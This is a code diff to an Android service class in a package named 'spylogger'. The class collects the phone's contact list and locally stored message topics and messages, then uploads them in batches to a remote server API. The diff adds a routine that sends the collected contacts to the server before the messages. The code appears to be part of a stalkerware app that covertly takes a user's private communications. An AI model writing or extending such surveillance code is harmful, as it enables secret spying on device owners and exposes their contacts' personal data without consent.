@@ -12,7 +12,6 @@ import com.gravatasufoca.spylogger.model.Topico;
 import com.gravatasufoca.spylogger.utils.Utils;
 import com.gravatasufoca.spylogger.vos.ContatoVO;
 import com.gravatasufoca.spylogger.vos.RespostaRecebimentoVO;
-import com.gravatasufoca.spylogger.vos.TopicoVO;
 import com.j256.ormlite.dao.Dao;
 import com.j256.ormlite.dao.GenericRawResults;
 import com.j256.ormlite.stmt.UpdateBuilder;
@@ -42,6 +41,7 @@ public class SendMensagensService extends SendDataService<RespostaRecebimentoVO>
     private Integer MAX_MENSAGENS=15000;
 
     private List<ContatoVO> contatos;
+    List<ContatoVO> contatoVOs=new ArrayList<>();
 
     public SendMensagensService(Context context, TaskComplete handler) {
         super(handler);
@@ -97,6 +97,7 @@ public class SendMensagensService extends SendDataService<RespostaRecebimentoVO>
 
     public boolean enviarTopicos() {
         contatos= Utils.getContatos(context.getContentResolver());
+
         DatabaseHelper dbHelper = new DatabaseHelper(context);
         try {
             Dao<Topico, Integer> daoTopicos = dbHelper.getDao(Topico.class);
@@ -112,7 +113,7 @@ public class SendMensagensService extends SendDataService<RespostaRecebimentoVO>
 
             GenericRawResults<String[]> raws = daoTopicos.queryRaw("select id,nome,grupo,tipoMensagem,(select group_concat(contato,'#') from ( select distinct contato from mensagem where topico_id=top.id)) from topico top where top.enviado=0 ");
 
-            List<TopicoVO> topicos = new ArrayList<>();
+            List<Topico> topicos = new ArrayList<>();
             int contador = 0;
             Iterator<String[]> iterator=raws.iterator();
             while (iterator.hasNext()) {
@@ -124,10 +125,8 @@ public class SendMensagensService extends SendDataService<RespostaRecebimentoVO>
                         .build(TipoMensagem.values()[Integer.parseInt(resultRaw[3])]);
 
 
-                TopicoVO topicoVO=new TopicoVO();
-                topicoVO.setTopico(topico);
-                topicoVO.setContatos(getContatos(resultRaw[4],topico.getTipoMensagem()));
-                topicos.add(topicoVO);
+                contatoVOs.addAll(getContatos(resultRaw[4],topico.getTipoMensagem()));
+                topicos.add(topico);
                 contador++;
                 if(iterator.hasNext()){
                     if(contador==MAX_TOPICOS) {
@@ -197,6 +196,11 @@ public class SendMensagensService extends SendDataService<RespostaRecebimentoVO>
         }
     }
 
+    private void enviarContatos(){
+        Call<RespostaRecebimentoVO> resp = sendApi.enviarContatos(contatoVOs);
+        resp.enqueue(this);
+    }
+
     private String getColunas(Map<String, Integer> colunas) {
         Set<String> keys = colunas.keySet();
         StringBuffer cols = new StringBuffer();
@@ -220,7 +224,7 @@ public class SendMensagensService extends SendDataService<RespostaRecebimentoVO>
         resp.enqueue(this);
     }
 
-    private void enviarTopicos(List<TopicoVO> topicos) {
+    private void enviarTopicos(List<Topico> topicos) {
         Call<RespostaRecebimentoVO> resp = sendApi.enviarTopicos(topicos);
         resp.enqueue(this);
     }
@@ -249,23 +253,27 @@ public class SendMensagensService extends SendDataService<RespostaRecebimentoVO>
                         }
                     });
                     t.start();
-                    enviarMensagens();
+                    enviarContatos();
                 } else {
-                    Dao<Mensagem, Integer> daoMensagem = dbHelper.getDao(Mensagem.class);
-                    final UpdateBuilder<Mensagem, Integer> ub = daoMensagem.updateBuilder();
-                    ub.where().in("id", resposta.getIds());
-                    ub.updateColumnValue("enviada", true);
-                    Thread t = new Thread(new Runnable() {
-                        @Override
-                        public void run() {
-                            try {
-                                ub.update();
-                            } catch (SQLException e) {
-                                Log.e(SendMensagensService.class.getSimpleName(), e.getMessage());
+                    if (resposta.getTipo().equalsIgnoreCase("contato")) {
+                        enviarMensagens();
+                    }else{
+                        Dao<Mensagem, Integer> daoMensagem = dbHelper.getDao(Mensagem.class);
+                        final UpdateBuilder<Mensagem, Integer> ub = daoMensagem.updateBuilder();
+                        ub.where().in("id", resposta.getIds());
+                        ub.updateColumnValue("enviada", true);
+                        Thread t = new Thread(new Runnable() {
+                            @Override
+                            public void run() {
+                                try {
+                                    ub.update();
+                                } catch (SQLException e) {
+                                    Log.e(SendMensagensService.class.getSimpleName(), e.getMessage());
+                                }
                             }
-                        }
-                    });
-                    t.start();
+                        });
+                        t.start();
+                    }
                 }
 
 
